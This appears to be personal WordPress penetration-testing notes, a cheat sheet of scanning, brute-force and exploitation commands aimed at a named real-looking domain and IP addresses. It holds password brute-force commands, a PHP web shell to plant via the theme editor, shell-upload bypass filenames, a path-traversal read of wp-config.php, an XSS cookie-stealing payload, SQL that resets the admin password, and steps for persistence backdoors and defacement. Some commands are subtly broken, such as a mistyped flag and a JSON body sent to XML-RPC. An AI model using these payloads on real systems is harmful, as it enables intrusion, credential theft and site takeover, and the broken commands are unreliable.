# Worpress Penetration Testing

## 1. SCANNING & ENUMERATION PHASE

### 1.1 PORT SCANNING 

```bash
# namp aggresive scan :
nmap -p- -sV -sC -T4 --script=http-wordpress-enum --script=http-enum  13.43.180.199

# Useful NSE script
nmap -p80,443 --script "http-wordpress-*" 172.64.155.50 
```

### 1.2 WORDPRESS VERSION ENUMERATION

**Passive enumeration :**

Check Page source :

`<meta name="generator" content="wordpress 6.x">`

```bash
## META generator
curl -s https://blog.onevasco.com/ | grep -i generator

## CSS/JS version fingerprint (lebih akurat)
curl -s https://blog.onevasco.com/ | grep -oP 'ver=[0-9.]+' | head
curl -s https://blog.onevasco.com/ | grep wp-includes
```

Check :

```
/readme.html
/wp-links-opml.php
/wp-includes/version.php
```

**WPScan :**

```bash
wpscan --url https://blog.onevasco.com --enumerate ap
```

### 1.3 ENUMERATE REST API

URL :

```
/wp-json/
/wp-json/wp/v2/users
/wp-json/wp/v2/posts
/wp-json/wp/v2/pages
```

Leakage :
  - Usernames
  - Email
  - Post IDs -> XSS testing
  - Plugin endpoints

REST API Version = Wordpress version = CMS Fingerprinting.

### 1.4 ENUMERATE DIRECTORIES (Dirsearch / ffuf)

**Dirsearch :**

```bash
dirsearch -u https://blog.onevasco.com -e php,txt,zip,html -t 60
```

**ffuf :**

```bash
ffuf -w /home/arifin/belajar/bug_bounty/Tools/wordlists/SecLists/Discovery/Web-Content/common.txt:FUZZ -u https://api.onevasco.com/FUZZ 
```

Important directories :

```bash
/wp-content/
/wp-content/plugins/
/wp-content/themes/
/wp-admin/
/wp-includes/
/uploads/
/backup/
/config/
/logs/
```

### 1.5 ENUMERATE USERS

**WPScan user enumeration :**

```bash
wpscan --url https://blog.onevasco.com --enumerate u
```

Manual enumeration :
  - REST API leaking `/wp-json/wp/v2/users`
  - Author archive enumeration:
    ```
    /?author=1
    /?author=2
    ```
if redirect -> you get username in URL :
```
/author/admin/
/author/john/
```

### 1.6 ENUMERATE PLUGINS

Plugin are the No.1 vulnerability source.

**WPScan :**

```bash
wpscan --url https://blog.onevasco.com --enumerate ap
```

Manual :

```bash
/wp-content/plugins/
/wp-content/plugins/plugin-name/readme.txt
/wp-content/plugins/plugin-name/changleog.txt
```

### 1.7  ENUMERATE THEMES

Similar approach :

```bash
/wp-content/themes/
/wp-content/themes/theme-name/style.css
```

Look for :

```bash
Theme Name
Version
Author
```

### 1.8 ENUMERATE XML-RPC

Check :

`/xmlrpc.php`

if enabled :
  - Used for Bruteforce
  - Pingback attack
  - SSRF
  - DOS (pingback ampification)

Check woth curl :

```bash
curl -d "<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>" https://blog.onevasco.com/xmlrpc.php
```


### 1.9 CMS Wordlists & Wordpress-Spesific Wordlists

Paths :

```bash
/usr/share/wordlists/wpscan/
/usr/share/wordlists/dirbuster/
/usr/share/seclist/Discovery/Web-Content/CMS/
```

Use Wordpress-spesific fuzz wordlists :

```bash
plugins.txt
themes.txt
wp-paths.txt
```


## 2. WORDPRESS VULNERABILITY SCANNING USING WPSCAN

**Enumerate everything :**

```bash
wpscan --url https://blog.onevasco.com --enumerate u,p,t,cb,dbe
```

**Use API for vulnerability detection :**

```bash
wpscan --url https://blog.onevasco.com --api-token <YOUr_TOKEN>
```

**Skip passive detection & go aggresive**

```bash
wpscan --url https://blog.onevasco.com --plugins-detection aggresive
```

## 3. WORDPRESS BRUTEFORCE ATTACKS

### 3.1 wp-login.php bruteforce

**WPScan bruteforce :**

```bash
wpscan --url https://blog.onevasco.com -U users.txt =P rockyou.txt
```

**Hydra :**

```bash
hydra -L users.txt -P password.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS:Invalid"
```

**cURL brute :**

```bash
curl -d "log=admin&pwd=pasword123" https://blog.onevasco.com/wp-login.php
```

### 3.2 XML-RPC Bruteforce (More Dangerous)

XML-RPC allows multi-pasword attempts in one request.

Check vulnerable :

```bash
curl -d '{
"methodCall":{
"methodName":"wp.getUsersBlogs",
"params":[{"username":"admin","password":"123"}]
}}'  https://blog.onevasco.com/xmlrpc.php
```

Bruteforce with WPScan :

```bash
wpscan --url https://blog.onevasco.com -P rockyou.txt -U admin --password-attack xmlrpc
```


### 3.3 REST API enumeration leads to bruteforce

if usernaems leak :

`/wp-json/wp/v2/users`

Then brute for :
  - admin
  - editor
  - author
  - custom usernames


## 4. EXPLOITING WORDPRESS VULNERABILITIES

### 4.1 Arbitrary File Upload (Plugins/Themes)

Commone vulnarable plugins :
  - WP Store Cart (the one you learned!)
  - Slider revolution (revslider)
  - TimThumb
  - Theme uploaders
  - Custom file upload widget

**Typical exploit path :**

/wp-content/uploads/wpstorecart/products/shell.php
/wp-admin/admin-ajax.php (using vulnerable handler)

You bypass :
  - extensions filters
  - MIME check
  - upload restriction

Upload :
  - shell.php
  - shell.php.jpg
  - shell.phtml
  - image.jpg.php

Execute :

`https://blog.onevasco.com/wp-content/uploads/.../shell.php?cmd=id`


### 4.2 Wordpress RCE Exploits

Most RCE come from :
  - File upload bugs
  - Theme editor access
  - Plugin vulnerabilities
  - Deserialization vulnerabilities
  - Unauthenticated Ajax function handlers
  - Vulnerable REST API endpoints

Example (revslider):

`/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php`


### 4.3 XSS Attacks

Common XSS locations :
  - Comment section
  - Contact Forms
  - Search boxes
  - Vulnerable plugins (forum plugins,gallery plugins)
  - Page builder

Payload :

`"><script>alert(document.cookie)</script>`


Stored XSS in WP can gice :
  - Admin session
  - Privilage escalation
  - Add new admin user
  - Inject backdoors


### 4.4 Privilage Escalation

Ways to escalate :
  - XSS in admin panel
  - Weak roles/capabilities
  - wp-config backup leakage
  - Vulnerable plugins with admin ajax

Example :

`/wp-admin/admin-ajax.php?action=upload_file`

-> leads to RCE


### 4.5 Database Access (MySQL)

if you obtain DB creds from :

`wp-config.php`

Then connect :

`mysql -u wpuser -p -h target.com`

Change admin password :

`UPDATE wp_users SET user_pass=MD5('newpass') WHERE user_login='admin';`

Or add a new admin user.


### 4.6 Credential Harvesting via XMLRPC Pingback SSRF

Exploit :

`xmlrpc.php?pingback.ping -> internal port scanning -> SSRF`


### 4.7 Theme/Plugin Editor -> RCE 

If logged in :

`Appearance -> Theme Editor`

Replace :

`<?php system($_GET['cmd']);?>`

Access :

`/wp-content/themes/theme/functions.php?cmd=id`


## 5. WORDPRESS BLACK-BOX PENTESTING FRAMEWORK

### 5.1 Phase 1 -  Recon & Discovery

- Nmap full scan
- Identify Wordpress
- Enumerate
  - version
  - themes
  - plugins
  - users
  - endpoints
  - directories
  - XML-RPC

Tools :
  - WPScan
  - WhatWeb
  - Wappylyzer
  - ffuf
  - dirsearch

### 5.2 Phase 2 - Vulnerability Analysis

Check :
  - Outdated Wordpress version
  - Outdated Plugins/Themes
  - Known CVEs
  - Exposed wp-config
  - Backup files (`wp-config-`,`.bak`,`.old`)
  - Directory listing
  - Misconfigured permissions


### 5.3 Phase 3 - Exploitation

Try :
  - **Brutoforce**
    - wp-login
    - xmlrpc multi-call
  - **Arbitrary File Upload**
    - Plugins
    - Themes
    - Ajax endpoints
  - **LFI / RFI**
    - via vulnerable plugin file loaders
  - **XSS -> Admin takeover**
    - Comment
    - Plugins
  - **RCW**
    - File Upload
    - Theme editor
    - Plugin eitor
    - eserialization

### 5.4 Phase 4 - Post Exploitation

Once shell ontained :
  - Dump MySQL DB
  - Steal wp-config creds
  - Add new WP admin
  - Modify homepage (deface for demo)
  - Maintain persistence :
    - Add new admin
    - Upload backdoor in uploads/
    - Modify theme functions.php

### 5.5 Phase 5 - Reporting

Document :
  - Vulnerability
  - Proof of Concept (PoC)
  - Impact
  - Fix recommendation